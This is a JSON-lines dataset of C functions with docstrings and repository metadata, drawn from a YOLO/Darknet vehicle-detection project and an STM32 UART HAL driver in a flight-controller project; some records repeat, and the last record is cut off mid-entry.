{"docstring": "//From Berkeley Vision's Caffe!\n//https://github.com/BVLC/caffe/blob/master/LICENSE\n", "func_signal": "void im2col_cpu(float* data_im,\n     int channels,  int height,  int width,\n     int ksize,  int stride, int pad, float* data_col)", "code": "{\n    int c,h,w;\n    int height_col = (height + 2*pad - ksize) / stride + 1;\n    int width_col = (width + 2*pad - ksize) / stride + 1;\n\n    int channels_col = channels * ksize * ksize;\n    for (c = 0; c < channels_col; ++c) {\n        int w_offset = c % ksize;\n        int h_offset = (c / ksize) % ksize;\n        int c_im = c / ksize / ksize;\n        for (h = 0; h < height_col; ++h) {\n            for (w = 0; w < width_col; ++w) {\n                int im_row = h_offset + h * stride;\n                int im_col = w_offset + w * stride;\n                int col_index = (c * height_col + h) * width_col + w;\n                data_col[col_index] = im2col_get_pixel(data_im, height, width, channels,\n                        im_row, im_col, c_im, pad);\n            }\n        }\n    }\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/im2col.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\nvoid transfer_node(list *s, list *d, node *n)\n{\n    node *prev, *next;\n    prev = n->prev;\n    next = n->next;\n    if(prev) prev->next = next;\n    if(next) next->prev = prev;\n    --s->size;\n    if(s->front == n) s->front = next;\n    if(s->back == n) s->back = prev;\n}\n*/\n", "func_signal": "void *list_pop(list *l)", "code": "{\n    if(!l->back) return 0;\n    node *b = l->back;\n    void *val = b->val;\n    l->back = b->prev;\n    if(l->back) l->back->next = 0;\n    free(b);\n    --l->size;\n    \n    return val;\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/list.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\nchar **get_random_paths_indexes(char **paths, int n, int m, int *indexes)\n{\n    char **random_paths = calloc(n, sizeof(char*));\n    int i;\n    pthread_mutex_lock(&mutex);\n    for(i = 0; i < n; ++i){\n        int index = rand()%m;\n        indexes[i] = index;\n        random_paths[i] = paths[index];\n        if(i == 0) printf(\"%s\\n\", paths[index]);\n    }\n    pthread_mutex_unlock(&mutex);\n    return random_paths;\n}\n*/\n", "func_signal": "char **get_random_paths(char **paths, int n, int m)", "code": "{\n    char **random_paths = calloc(n, sizeof(char*));\n    int i;\n    pthread_mutex_lock(&mutex);\n    for(i = 0; i < n; ++i){\n        int index = rand()%m;\n        random_paths[i] = paths[index];\n        //if(i == 0) printf(\"%s\\n\", paths[index]);\n    }\n    pthread_mutex_unlock(&mutex);\n    return random_paths;\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/data.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// old timing. is it better? who knows!!\n", "func_signal": "double get_wall_time()", "code": "{\n    struct timeval time;\n    if (gettimeofday(&time,NULL)){\n        return 0;\n    }\n    return (double)time.tv_sec + (double)time.tv_usec * .000001;\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/utils.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\n// old timing. is it better? who knows!!\ndouble get_wall_time()\n{\n    struct timeval time;\n    if (gettimeofday(&time,NULL)){\n        return 0;\n    }\n    return (double)time.tv_sec + (double)time.tv_usec * .000001;\n}\n*/\n", "func_signal": "double what_time_is_it_now()", "code": "{\n    struct timespec now;\n    clock_gettime(CLOCK_REALTIME, &now);\n    return now.tv_sec + now.tv_nsec*1e-9;\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/utils.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "//This one might be too, can't remember.\n", "func_signal": "void col2im_cpu(float* data_col,\n         int channels,  int height,  int width,\n         int ksize,  int stride, int pad, float* data_im)", "code": "{\n    int c,h,w;\n    int height_col = (height + 2*pad - ksize) / stride + 1;\n    int width_col = (width + 2*pad - ksize) / stride + 1;\n\n    int channels_col = channels * ksize * ksize;\n    for (c = 0; c < channels_col; ++c) {\n        int w_offset = c % ksize;\n        int h_offset = (c / ksize) % ksize;\n        int c_im = c / ksize / ksize;\n        for (h = 0; h < height_col; ++h) {\n            for (w = 0; w < width_col; ++w) {\n                int im_row = h_offset + h * stride;\n                int im_col = w_offset + w * stride;\n                int col_index = (c * height_col + h) * width_col + w;\n                double val = data_col[col_index];\n                col2im_add_pixel(data_im, height, width, channels,\n                        im_row, im_col, c_im, pad, val);\n            }\n        }\n    }\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/col2im.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\nvoid test_convolutional_layer()\n{\n    convolutional_layer l = make_convolutional_layer(1, 5, 5, 3, 2, 5, 2, 1, LEAKY, 1, 0, 0, 0);\n    l.batch_normalize = 1;\n    float data[] = {1,1,1,1,1,\n        1,1,1,1,1,\n        1,1,1,1,1,\n        1,1,1,1,1,\n        1,1,1,1,1,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        3,3,3,3,3,\n        3,3,3,3,3,\n        3,3,3,3,3,\n        3,3,3,3,3,\n        3,3,3,3,3};\n    //net.input = data;\n    //forward_convolutional_layer(l);\n}\n*/\n", "func_signal": "void resize_convolutional_layer(convolutional_layer *l, int w, int h)", "code": "{\n    l->w = w;\n    l->h = h;\n    int out_w = convolutional_out_width(*l);\n    int out_h = convolutional_out_height(*l);\n\n    l->out_w = out_w;\n    l->out_h = out_h;\n\n    l->outputs = l->out_h * l->out_w * l->out_c;\n    l->inputs = l->w * l->h * l->c;\n\n    l->output = realloc(l->output, l->batch*l->outputs*sizeof(float));\n    l->delta  = realloc(l->delta,  l->batch*l->outputs*sizeof(float));\n    if(l->batch_normalize){\n        l->x = realloc(l->x, l->batch*l->outputs*sizeof(float));\n        l->x_norm  = realloc(l->x_norm, l->batch*l->outputs*sizeof(float));\n    }\n\n#ifdef GPU\n    cuda_free(l->delta_gpu);\n    cuda_free(l->output_gpu);\n\n    l->delta_gpu =  cuda_make_array(l->delta,  l->batch*l->outputs);\n    l->output_gpu = cuda_make_array(l->output, l->batch*l->outputs);\n\n    if(l->batch_normalize){\n        cuda_free(l->x_gpu);\n        cuda_free(l->x_norm_gpu);\n\n        l->x_gpu = cuda_make_array(l->output, l->batch*l->outputs);\n        l->x_norm_gpu = cuda_make_array(l->output, l->batch*l->outputs);\n    }\n#ifdef CUDNN\n    cudnn_convolutional_setup(l);\n#endif\n#endif\n    l->workspace_size = get_workspace_size(*l);\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/convolutional_layer.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// From http://en.wikipedia.org/wiki/Box%E2%80%93Muller_transform\n", "func_signal": "float rand_normal()", "code": "{\n    static int haveSpare = 0;\n    static double rand1, rand2;\n\n    if(haveSpare)\n    {\n        haveSpare = 0;\n        return sqrt(rand1) * sin(rand2);\n    }\n\n    haveSpare = 1;\n\n    rand1 = rand() / ((double) RAND_MAX);\n    if(rand1 < 1e-100) rand1 = 1e-100;\n    rand1 = -2 * log(rand1);\n    rand2 = (rand() / ((double) RAND_MAX)) * TWO_PI;\n\n    return sqrt(rand1) * cos(rand2);\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/utils.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\nvoid test_convolutional_layer()\n{\n    convolutional_layer l = make_convolutional_layer(1, 5, 5, 3, 2, 5, 2, 1, LEAKY, 1, 0, 0, 0);\n    l.batch_normalize = 1;\n    float data[] = {1,1,1,1,1,\n        1,1,1,1,1,\n        1,1,1,1,1,\n        1,1,1,1,1,\n        1,1,1,1,1,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        2,2,2,2,2,\n        3,3,3,3,3,\n        3,3,3,3,3,\n        3,3,3,3,3,\n        3,3,3,3,3,\n        3,3,3,3,3};\n    //net.input = data;\n    //forward_convolutional_layer(l);\n}\n*/\n", "func_signal": "void resize_convolutional_layer(convolutional_layer *l, int w, int h)", "code": "{\n    l->w = w;\n    l->h = h;\n    int out_w = convolutional_out_width(*l);\n    int out_h = convolutional_out_height(*l);\n\n    l->out_w = out_w;\n    l->out_h = out_h;\n\n    l->outputs = l->out_h * l->out_w * l->out_c;\n    l->inputs = l->w * l->h * l->c;\n\n    l->output = realloc(l->output, l->batch*l->outputs*sizeof(float));\n    l->delta  = realloc(l->delta,  l->batch*l->outputs*sizeof(float));\n    if(l->batch_normalize){\n        l->x = realloc(l->x, l->batch*l->outputs*sizeof(float));\n        l->x_norm  = realloc(l->x_norm, l->batch*l->outputs*sizeof(float));\n    }\n\n#ifdef GPU\n    cuda_free(l->delta_gpu);\n    cuda_free(l->output_gpu);\n\n    l->delta_gpu =  cuda_make_array(l->delta,  l->batch*l->outputs);\n    l->output_gpu = cuda_make_array(l->output, l->batch*l->outputs);\n\n    if(l->batch_normalize){\n        cuda_free(l->x_gpu);\n        cuda_free(l->x_norm_gpu);\n\n        l->x_gpu = cuda_make_array(l->output, l->batch*l->outputs);\n        l->x_norm_gpu = cuda_make_array(l->output, l->batch*l->outputs);\n    }\n#ifdef CUDNN\n    cudnn_convolutional_setup(l);\n#endif\n#endif\n    l->workspace_size = get_workspace_size(*l);\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/convolutional_layer.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// ./darknet nightmare cfg/extractor.recon.cfg ~/trained/yolo-coco.conv frame6.png -reconstruct -iters 500 -i 3 -lambda .1 -rate .01 -smooth 2\n", "func_signal": "float abs_mean(float *x, int n)", "code": "{\n    int i;\n    float sum = 0;\n    for (i = 0; i < n; ++i){\n        sum += fabs(x[i]);\n    }\n    return sum/n;\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/examples/nightmare.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\nvoid transfer_node(list *s, list *d, node *n)\n{\n    node *prev, *next;\n    prev = n->prev;\n    next = n->next;\n    if(prev) prev->next = next;\n    if(next) next->prev = prev;\n    --s->size;\n    if(s->front == n) s->front = next;\n    if(s->back == n) s->back = prev;\n}\n*/\n", "func_signal": "void *list_pop(list *l)", "code": "{\n    if(!l->back) return 0;\n    node *b = l->back;\n    void *val = b->val;\n    l->back = b->prev;\n    if(l->back) l->back->next = 0;\n    free(b);\n    --l->size;\n    \n    return val;\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/list.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "// From http://en.wikipedia.org/wiki/Box%E2%80%93Muller_transform\n", "func_signal": "float rand_normal()", "code": "{\n    static int haveSpare = 0;\n    static double rand1, rand2;\n\n    if(haveSpare)\n    {\n        haveSpare = 0;\n        return sqrt(rand1) * sin(rand2);\n    }\n\n    haveSpare = 1;\n\n    rand1 = rand() / ((double) RAND_MAX);\n    if(rand1 < 1e-100) rand1 = 1e-100;\n    rand1 = -2 * log(rand1);\n    rand2 = (rand() / ((double) RAND_MAX)) * TWO_PI;\n\n    return sqrt(rand1) * cos(rand2);\n}", "path": "2018AICity_TeamUW/Track1/3_YOLO_VEH/src/utils.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "//From Berkeley Vision's Caffe!\n//https://github.com/BVLC/caffe/blob/master/LICENSE\n", "func_signal": "void im2col_cpu(float* data_im,\n     int channels,  int height,  int width,\n     int ksize,  int stride, int pad, float* data_col)", "code": "{\n    int c,h,w;\n    int height_col = (height + 2*pad - ksize) / stride + 1;\n    int width_col = (width + 2*pad - ksize) / stride + 1;\n\n    int channels_col = channels * ksize * ksize;\n    for (c = 0; c < channels_col; ++c) {\n        int w_offset = c % ksize;\n        int h_offset = (c / ksize) % ksize;\n        int c_im = c / ksize / ksize;\n        for (h = 0; h < height_col; ++h) {\n            for (w = 0; w < width_col; ++w) {\n                int im_row = h_offset + h * stride;\n                int im_col = w_offset + w * stride;\n                int col_index = (c * height_col + h) * width_col + w;\n                data_col[col_index] = im2col_get_pixel(data_im, height, width, channels,\n                        im_row, im_col, c_im, pad);\n            }\n        }\n    }\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/im2col.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/*\n// old timing. is it better? who knows!!\ndouble get_wall_time()\n{\n    struct timeval time;\n    if (gettimeofday(&time,NULL)){\n        return 0;\n    }\n    return (double)time.tv_sec + (double)time.tv_usec * .000001;\n}\n*/\n", "func_signal": "double what_time_is_it_now()", "code": "{\n    struct timespec now;\n    clock_gettime(CLOCK_REALTIME, &now);\n    return now.tv_sec + now.tv_nsec*1e-9;\n}", "path": "2018AICity_TeamUW/Track3/2_YOLO_LP/src/utils.c", "commit_date": "2019-07-13 00:00:00", "repo_name": "zhengthomastang/2018AICity_TeamUW", "stars": 549, "license": "None", "language": "c", "size": 100789}
{"docstring": "/**\n  * @brief Pause the DMA Transfer.\n  * @param huart UART handle.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UART_DMAPause(UART_HandleTypeDef *huart)", "code": "{\n  const HAL_UART_StateTypeDef gstate = huart->gState;\n  const HAL_UART_StateTypeDef rxstate = huart->RxState;\n\n  __HAL_LOCK(huart);\n\n  if ((HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAT)) &&\n      (gstate == HAL_UART_STATE_BUSY_TX))\n  {\n    /* Disable the UART DMA Tx request */\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAT);\n  }\n  if ((HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR)) &&\n      (rxstate == HAL_UART_STATE_BUSY_RX))\n  {\n    /* Disable PE and ERR (Frame error, noise error, overrun error) interrupts */\n    CLEAR_BIT(huart->Instance->CR1, USART_CR1_PEIE);\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);\n\n    /* Disable the UART DMA Rx request */\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);\n  }\n\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief DMA UART transmit process half complete callback.\n  * @param hdma DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_DMATxHalfCplt(DMA_HandleTypeDef *hdma)", "code": "{\n  UART_HandleTypeDef *huart = (UART_HandleTypeDef *)(hdma->Parent);\n\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n  /*Call registered Tx Half complete callback*/\n  huart->TxHalfCpltCallback(huart);\n#else\n  /*Call legacy weak Tx Half complete callback*/\n  HAL_UART_TxHalfCpltCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief Disable UART Stop Mode.\n  * @param huart UART handle.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_DisableStopMode(UART_HandleTypeDef *huart)", "code": "{\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  /* Clear UESM bit */\n  CLEAR_BIT(huart->Instance->CR1, USART_CR1_UESM);\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart_ex.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief DMA UART receive process complete callback.\n  * @param hdma DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_DMAReceiveCplt(DMA_HandleTypeDef *hdma)", "code": "{\n  UART_HandleTypeDef *huart = (UART_HandleTypeDef *)(hdma->Parent);\n\n  /* DMA Normal mode */\n  if (hdma->Init.Mode != DMA_CIRCULAR)\n  {\n    huart->RxXferCount = 0U;\n\n    /* Disable PE and ERR (Frame error, noise error, overrun error) interrupts */\n    CLEAR_BIT(huart->Instance->CR1, USART_CR1_PEIE);\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);\n\n    /* Disable the DMA transfer for the receiver request by resetting the DMAR bit\n       in the UART CR3 register */\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);\n\n    /* At end of Rx process, restore huart->RxState to Ready */\n    huart->RxState = HAL_UART_STATE_READY;\n  }\n\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n  /*Call registered Rx complete callback*/\n  huart->RxCpltCallback(huart);\n#else\n  /*Call legacy weak Rx complete callback*/\n  HAL_UART_RxCpltCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief This function handles Pre-fetch fault, memory access fault.\n  */\n", "func_signal": "void BusFault_Handler(void)", "code": "{\n  /* USER CODE BEGIN BusFault_IRQn 0 */\n\n  /* USER CODE END BusFault_IRQn 0 */\n  while (1)\n  {\n    /* USER CODE BEGIN W1_BusFault_IRQn 0 */\n    /* USER CODE END W1_BusFault_IRQn 0 */\n  }\n}", "path": "HadesFCS/Firmware/F4/HadesF4Testbed_RTOS/Core/Src/stm32f4xx_it.c", "commit_date": "2019-12-19 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief DMA UART receive process half complete callback.\n  * @param hdma DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_DMARxHalfCplt(DMA_HandleTypeDef *hdma)", "code": "{\n  UART_HandleTypeDef *huart = (UART_HandleTypeDef *)(hdma->Parent);\n\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n  /*Call registered Rx Half complete callback*/\n  huart->RxHalfCpltCallback(huart);\n#else\n  /*Call legacy weak Rx Half complete callback*/\n  HAL_UART_RxHalfCpltCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief RX interrrupt handler for 7 or 8 bits data word length .\n  * @param huart UART handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_RxISR_8BIT(UART_HandleTypeDef *huart)", "code": "{\n  uint16_t uhMask = huart->Mask;\n  uint16_t  uhdata;\n\n  /* Check that a Rx process is ongoing */\n  if (huart->RxState == HAL_UART_STATE_BUSY_RX)\n  {\n    uhdata = (uint16_t) READ_REG(huart->Instance->RDR);\n    *huart->pRxBuffPtr = (uint8_t)(uhdata & (uint8_t)uhMask);\n    huart->pRxBuffPtr++;\n    huart->RxXferCount--;\n\n    if (huart->RxXferCount == 0U)\n    {\n      /* Disable the UART Parity Error Interrupt and RXNE interrupts */\n      CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));\n\n      /* Disable the UART Error Interrupt: (Frame error, noise error, overrun error) */\n      CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);\n\n      /* Rx process is completed, restore huart->RxState to Ready */\n      huart->RxState = HAL_UART_STATE_READY;\n\n      /* Clear RxISR function pointer */\n      huart->RxISR = NULL;\n\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n      /*Call registered Rx complete callback*/\n      huart->RxCpltCallback(huart);\n#else\n      /*Call legacy weak Rx complete callback*/\n      HAL_UART_RxCpltCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n    }\n  }\n  else\n  {\n    /* Clear RXNE interrupt flag */\n    __HAL_UART_SEND_REQ(huart, UART_RXDATA_FLUSH_REQUEST);\n  }\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief  Enable the FIFO mode.\n  * @param huart      UART handle.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_EnableFifoMode(UART_HandleTypeDef *huart)", "code": "{\n  uint32_t tmpcr1;\n\n  /* Check parameters */\n  assert_param(IS_UART_FIFO_INSTANCE(huart->Instance));\n\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  huart->gState = HAL_UART_STATE_BUSY;\n\n  /* Save actual UART configuration */\n  tmpcr1 = READ_REG(huart->Instance->CR1);\n\n  /* Disable UART */\n  __HAL_UART_DISABLE(huart);\n\n  /* Enable FIFO mode */\n  SET_BIT(tmpcr1, USART_CR1_FIFOEN);\n  huart->FifoMode = UART_FIFOMODE_ENABLE;\n\n  /* Restore UART configuration */\n  WRITE_REG(huart->Instance->CR1, tmpcr1);\n\n  /* Determine the number of data to process during RX/TX ISR execution */\n  UARTEx_SetNbDataToProcess(huart);\n\n  huart->gState = HAL_UART_STATE_READY;\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart_ex.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief TX interrrupt handler for 7 or 8 bits data word length and FIFO mode is enabled.\n  * @note   Function is called under interruption only, once\n  *         interruptions have been enabled by HAL_UART_Transmit_IT().\n  * @param huart UART handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_TxISR_8BIT_FIFOEN(UART_HandleTypeDef *huart)", "code": "{\n  uint16_t  nb_tx_data;\n\n  /* Check that a Tx process is ongoing */\n  if (huart->gState == HAL_UART_STATE_BUSY_TX)\n  {\n    for (nb_tx_data = huart->NbTxDataToProcess ; nb_tx_data > 0U ; nb_tx_data--)\n    {\n      if (huart->TxXferCount == 0U)\n      {\n        /* Disable the TX FIFO threshold interrupt */\n        CLEAR_BIT(huart->Instance->CR3, USART_CR3_TXFTIE);\n\n        /* Enable the UART Transmit Complete Interrupt */\n        SET_BIT(huart->Instance->CR1, USART_CR1_TCIE);\n\n        break; /* force exit loop */\n      }\n      else if (READ_BIT(huart->Instance->ISR, USART_ISR_TXE_TXFNF) != 0U)\n      {\n        huart->Instance->TDR = (uint8_t)(*huart->pTxBuffPtr & (uint8_t)0xFF);\n        huart->pTxBuffPtr++;\n        huart->TxXferCount--;\n      }\n      else\n      {\n        /* Nothing to do */\n      }\n    }\n  }\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief  Abort ongoing Receive transfer (blocking mode).\n  * @param  huart UART handle.\n  * @note   This procedure could be used for aborting any ongoing Rx transfer started in Interrupt or DMA mode.\n  *         This procedure performs following operations :\n  *           - Disable UART Interrupts (Rx)\n  *           - Disable the DMA transfer in the peripheral register (if enabled)\n  *           - Abort DMA transfer by calling HAL_DMA_Abort (in case of transfer in DMA mode)\n  *           - Set handle State to READY\n  * @note   This procedure is executed in blocking mode : when exiting function, Abort is considered as completed.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UART_AbortReceive(UART_HandleTypeDef *huart)", "code": "{\n  /* Disable PEIE, EIE, RXNEIE and RXFTIE interrupts */\n  CLEAR_BIT(huart->Instance->CR1, (USART_CR1_PEIE | USART_CR1_RXNEIE_RXFNEIE));\n  CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE | USART_CR3_RXFTIE);\n\n  /* Disable the UART DMA Rx request if enabled */\n  if (HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR))\n  {\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);\n\n    /* Abort the UART DMA Rx channel : use blocking DMA Abort API (no callback) */\n    if (huart->hdmarx != NULL)\n    {\n      /* Set the UART DMA Abort callback to Null.\n         No call back execution at end of DMA abort procedure */\n      huart->hdmarx->XferAbortCallback = NULL;\n\n      if (HAL_DMA_Abort(huart->hdmarx) != HAL_OK)\n      {\n        if (HAL_DMA_GetError(huart->hdmarx) == HAL_DMA_ERROR_TIMEOUT)\n        {\n          /* Set error code to DMA */\n          huart->ErrorCode = HAL_UART_ERROR_DMA;\n\n          return HAL_TIMEOUT;\n        }\n      }\n    }\n  }\n\n  /* Reset Rx transfer counter */\n  huart->RxXferCount = 0U;\n\n  /* Clear the Error flags in the ICR register */\n  __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF | UART_CLEAR_NEF | UART_CLEAR_PEF | UART_CLEAR_FEF);\n\n  /* Discard the received data */\n  __HAL_UART_SEND_REQ(huart, UART_RXDATA_FLUSH_REQUEST);\n\n  /* Restore huart->RxState to Ready */\n  huart->RxState = HAL_UART_STATE_READY;\n\n  return HAL_OK;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief This function handles Hard fault interrupt.\n  */\n", "func_signal": "void HardFault_Handler(void)", "code": "{\n  /* USER CODE BEGIN HardFault_IRQn 0 */\n\n  /* USER CODE END HardFault_IRQn 0 */\n  while (1)\n  {\n    /* USER CODE BEGIN W1_HardFault_IRQn 0 */\n    /* USER CODE END W1_HardFault_IRQn 0 */\n  }\n}", "path": "HadesFCS/Firmware/F4/HadesF4Testbed_RTOS/Core/Src/stm32f4xx_it.c", "commit_date": "2019-12-19 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief DMA UART communication error callback.\n  * @param hdma DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_DMAError(DMA_HandleTypeDef *hdma)", "code": "{\n  UART_HandleTypeDef *huart = (UART_HandleTypeDef *)(hdma->Parent);\n\n  const HAL_UART_StateTypeDef gstate = huart->gState;\n  const HAL_UART_StateTypeDef rxstate = huart->RxState;\n\n  /* Stop UART DMA Tx request if ongoing */\n  if ((HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAT)) &&\n      (gstate == HAL_UART_STATE_BUSY_TX))\n  {\n    huart->TxXferCount = 0U;\n    UART_EndTxTransfer(huart);\n  }\n\n  /* Stop UART DMA Rx request if ongoing */\n  if ((HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR)) &&\n      (rxstate == HAL_UART_STATE_BUSY_RX))\n  {\n    huart->RxXferCount = 0U;\n    UART_EndRxTransfer(huart);\n  }\n\n  huart->ErrorCode |= HAL_UART_ERROR_DMA;\n\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n  /*Call registered error callback*/\n  huart->ErrorCallback(huart);\n#else\n  /*Call legacy weak error callback*/\n  HAL_UART_ErrorCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n}", "path": 